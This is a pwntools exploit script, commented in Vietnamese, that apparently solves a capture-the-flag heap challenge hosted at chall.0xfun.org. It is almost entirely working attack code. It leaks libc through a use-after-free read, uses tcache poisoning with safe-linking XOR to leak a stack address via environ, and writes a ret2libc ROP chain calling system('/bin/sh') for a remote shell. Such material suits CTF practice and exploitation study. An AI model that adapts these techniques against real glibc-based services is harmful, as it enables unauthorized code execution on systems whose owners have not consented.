from pwn import *

context.log_level = 'info' 
context.arch = 'amd64'

exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# p = process(['./ld-linux-x86-64.so.2', './chall'], env={"LD_PRELOAD": "./libc.so.6"})
p = remote('chall.0xfun.org', 54505)

def add(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"New Data: ", data)


# ==================================================
# BƯỚC 1: LEAK LIBC AN TOÀN
# ==================================================
log.info("--- BƯỚC 1: LEAK LIBC ---")
for i in range(2, 9): add(i, 1024, b"fill\n")
add(0, 0x18, b"guard1\n")
add(9, 1024, b"target\n")
add(1, 0x18, b"guard2\n")

for i in range(2, 9): delete(i)
delete(9)
add(2, 0x58, b"carve\n")

show(9)
p.recvuntil(b"Data: ")
raw_libc = p.recv(1024)
libc_leak = 0
for i in range(len(raw_libc) - 7):
    val = u64(raw_libc[i:i+8])
    if val > 0x700000000000 and (val & 0xfff) == 0xb20:
        libc_leak = val
        break
libc.address = libc_leak - 0x1e7b20
log.success(f"Libc Base: {hex(libc.address)}")


# ==================================================
# BƯỚC 2: TCACHE POISON LẤY STACK LEAK 
# ==================================================
log.info("--- BƯỚC 2: LEAK STACK ---")
add(3, 0x28, b"T1\n")
delete(3)

show(3)
p.recvuntil(b"Data: ")
shift_key_3 = u64(p.recv(0x28)[:8])

target_env = (libc.symbols['environ'] - 0x10) & 0xfffffffffffffff0
offset_env = libc.symbols['environ'] - target_env

edit(3, p64(target_env ^ shift_key_3))

add(4, 0x28, b"A\n") 
add(5, 0x28, b"A\n") 

show(5)
p.recvuntil(b"Data: ")
raw_env = p.recv(0x28)
stack_leak = u64(raw_env[offset_env : offset_env + 8])
log.success(f"Stack Leak: {hex(stack_leak)}")


# ==================================================
# BƯỚC 3: ROP MANAUL SIÊU CHUẨN XÁC
# ==================================================
log.info("--- BƯỚC 3: ROP TO SHELL ---")

ret_addr = stack_leak - 0x150
target_rbp = ret_addr - 8 # Vị trí RBP chia hết cho 16, an toàn tuyệt đối
log.success(f"Target RBP: {hex(target_rbp)}")

add(6, 0x68, b"R1\n")
delete(6)

show(6)
p.recvuntil(b"Data: ")
shift_key_6 = u64(p.recv(0x68)[:8])

# Trỏ thẳng kim tiêm vào RBP
edit(6, p64(target_rbp ^ shift_key_6))
add(7, 0x68, b"A\n") 

# Nhặt Gadget thủ công, bỏ qua sự phụ thuộc vào Pwntools Auto ROP
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
system = libc.symbols['system']
binsh = next(libc.search(b"/bin/sh"))

# Cấu trúc: [RBP gốc] + [Căn lề 16 byte] + [ROP Chain]
payload = p64(stack_leak)      # 1. Phục hồi RBP (8 byte đầu)
payload += p64(ret_gadget)     # 2. Ghi đè Return Address bằng lệnh 'ret' (Căn lề Stack chống lỗi MOVAPS)
payload += p64(pop_rdi)        # 3. Chuẩn bị tham số cho system
payload += p64(binsh) 
payload += p64(system)         # 4. Kích nổ Shell!
payload = payload.ljust(0x68, b"\x00")

log.info("Bơm ROP Chain thủ công...")

# Lệnh cuối cùng. Ngay khi chạy xong, hàm add() sẽ Return thẳng vào Shell!
add(8, 0x68, payload)

p.interactive()